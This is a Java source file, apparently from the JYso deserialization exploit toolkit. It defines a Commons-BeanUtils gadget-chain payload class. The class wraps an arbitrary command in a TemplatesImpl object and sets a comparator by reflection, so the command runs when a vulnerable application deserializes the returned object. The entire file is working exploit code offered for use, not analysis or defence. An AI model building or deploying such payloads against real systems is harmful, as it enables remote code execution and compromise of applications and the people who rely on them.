package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.qi4l.JYso.gadgets.utils.Reflections;
import org.apache.commons.lang3.compare.ObjectToStringComparator;

import java.util.Comparator;

import static com.qi4l.JYso.gadgets.cb_AttrCompare183.getCbSink_2;
import static com.qi4l.JYso.gadgets.cb_AttrCompare183.getCbSink_3;

@SuppressWarnings({"rawtypes", "unused"})
@Dependencies({"commons-beanutils:commons-beanutils:1.8.3", "org.apache.commons:commons-lang3:3.10", "commons-beanutils:commons-beanutils:1.7X"})
@Authors({"SummerSec"})
public class cb_ObjectToStringComparator183 implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        final Object template;
        template = Gadgets.createTemplatesImpl(command);

        Comparator beanComparator = getCbSink_2();

        Reflections.setFieldValue(beanComparator, "comparator", new ObjectToStringComparator());
        ObjectToStringComparator stringComparator = new ObjectToStringComparator();

        return getCbSink_3(beanComparator, stringComparator, template);
    }
}
